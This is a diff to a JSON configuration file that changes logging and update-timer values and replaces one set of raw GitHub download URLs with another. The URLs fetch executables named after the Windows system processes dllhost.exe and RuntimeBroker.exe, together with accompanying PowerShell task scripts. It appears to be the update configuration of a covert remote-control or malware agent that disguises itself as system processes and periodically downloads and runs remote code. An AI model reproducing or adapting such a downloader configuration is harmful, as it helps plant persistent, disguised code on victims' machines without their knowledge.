@@ -1,20 +1,20 @@
 {
-  "logLevel": 5,
-  "ConfirmationLog": false,
-  "ConfirmationInterval": 300001,
-  "UpdateTimerInterval": 60000,
+  "logLevel": 6,
+  "ConfirmationLog": true,
+  "ConfirmationInterval": 1200000,
+  "UpdateTimerInterval": 480000,
   "dllhostFiles": [
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe.config",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Newtonsoft.Json.dll",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/tskdllhost.ps1"
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskdllhost.ps1"
   ],
   "runtimebrokerFiles": [
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe.config",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Newtonsoft.Json.dll",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/tskRuntimeBroker.ps1"
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskRuntimeBroker.ps1"
   ],
-  "dllhostConfig": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe.config",
-  "runtimebrokerConfig": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe.config"
+  "dllhostConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
+  "runtimebrokerConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config"
 }
